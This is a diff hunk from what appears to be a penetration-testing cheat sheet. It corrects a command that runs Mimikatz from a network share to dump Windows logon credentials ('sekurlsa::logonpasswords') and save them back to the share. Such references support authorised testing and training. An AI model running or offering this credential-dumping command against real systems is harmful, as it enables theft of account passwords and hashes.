@@ -534,7 +534,7 @@ grep -i <keyword> *
   
   ### Run Mimikatz from host and write output to the share
   ```bash
-  \\<target_IP>\<shareName> "privilege::debug: sekurlsa::logonpasswords exit" > \\<target_IP>\<shareName>\output.txt
+  \\<target_IP>\<shareName>\mimikatz.exe "privilege::debug: sekurlsa::logonpasswords exit" > \\<target_IP>\<shareName>\output.txt
   ```
   
 </details> 
